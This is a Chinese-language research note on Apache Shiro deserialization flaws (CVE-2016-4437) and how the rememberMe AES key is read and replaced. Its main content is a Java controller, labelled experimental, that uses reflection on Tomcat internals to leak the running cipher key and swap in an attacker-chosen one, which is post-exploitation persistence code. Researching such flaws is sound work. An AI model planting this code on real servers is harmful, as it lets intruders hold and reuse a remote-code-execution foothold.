前置基础
---

Apache Shiro是一个功能强大且易于使用的Java安全框架，功能包括身份验证，授权，加密和会话管理。 


相关漏洞
---

### Shiro550 CVE-2016-4437

```
git clone https://github.com/apache/shiro.git  
cd shiro
git checkout shiro-root-1.2.4
```

登陆时-设置rememberMe-记录用户登录的凭证 

- 序列化用户身份"user"
- 对user进行AES加密，密钥为常量
- base64编码
- 设置到cookie中的rememberme字段



登陆后-rememberMe解密-识别用户身份

- 读取cookie中rememberMe值
- base64解码
- AES解密
- 反序列化



### Shiro721 CVE-2019-12422



研究利用
---

### Key 修改

测试环境

- shiro 1.2.24

#### 获取key

- 方式1：getCipherKey()

![image-20211118154359697](vulnerability-research.assets/image-20211118154359697.png)

- 方式2：爆破

![image-20211118155031602](vulnerability-research.assets/image-20211118155031602.png)

#### 修改key

##### 方式1: 成员变量

![image-20211118154624802](vulnerability-research.assets/image-20211118154624802.png)



![image-20211118154847035](vulnerability-research.assets/image-20211118154847035.png)

爆破密钥

![image-20211118154924247](vulnerability-research.assets/image-20211118154924247.png)



执行命令

![image-20211118155359227](vulnerability-research.assets/image-20211118155359227.png)

##### 方式2: 成员方法 setCipherKey

![image-20211118155853780](vulnerability-research.assets/image-20211118155853780.png)

#### 相关代码
`仅为实验性代码`

```java
package com.example.controller;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.shiro.web.mgt.CookieRememberMeManager;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.Map;

@Controller
public class ShiroKeyController {
    @RequestMapping(value = "/getKey")
    public void getShiroKey(HttpServletResponse resp){
        try{
            byte[] key = new CookieRememberMeManager().getCipherKey();
            resp.getWriter().write("shiro key: \n" + new String(Base64.getEncoder().encode(key)));
        }catch (Exception ignored){}

    }
    @RequestMapping(value = "/changeKey")
    public void changeShiroKey(HttpServletResponse resp){
        try {
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
            Field Configs = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("filterConfigs");
            Configs.setAccessible(true);
            Map filterConfigs = (Map) Configs.get(standardContext);
            ApplicationFilterConfig applicationFilterConfig = (ApplicationFilterConfig) filterConfigs.get("shiroFilterFactoryBean");
            Field filterDef = getField(applicationFilterConfig,"filterDef");
            FilterDef filterDefIns = (FilterDef)filterDef.get(applicationFilterConfig);
            Field filter = getField(filterDefIns,"filter");
            Object filterIns = filter.get(filterDefIns);
            Field securityM = getField(filterIns,"securityManager");
            org.apache.shiro.mgt.SecurityManager securityInstance = (org.apache.shiro.mgt.SecurityManager)securityM.get(filterIns);
            CookieRememberMeManager cookieRememberMeManager = (CookieRememberMeManager) getField(securityInstance,"rememberMeManager").get(securityInstance);
            byte[] cipherKey = java.util.Base64.getDecoder().decode("2AvVhdsgUs0FSA3SDFAdag==");
            // cookieRememberMeManager.setCipherKey(cipherKey);
            setFieldValue(cookieRememberMeManager,"encryptionCipherKey",cipherKey);
            setFieldValue(cookieRememberMeManager,"decryptionCipherKey",cipherKey);
            resp.getWriter().write("new shiro key: \n" + new String(Base64.getEncoder().encode(cipherKey)));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void setFieldValue(Object object,String fieldName,Object fieldValue) throws Exception {
        Field field =  getField(object,fieldName);
        field.set(object,fieldValue);
    }

    public static Field getField(Object object,String fieldName) {
        Class<? extends Object> clas = object.getClass();
        Field field = null;
        while (clas != Object.class){
            try {
                field = clas.getDeclaredField(fieldName);
                break;
            } catch (NoSuchFieldException e){
                clas = clas.getSuperclass();
            }
        }
        if (field != null){
            field.setAccessible(true);
            return field;
        }else {
            return null;
        }
    }
}
```
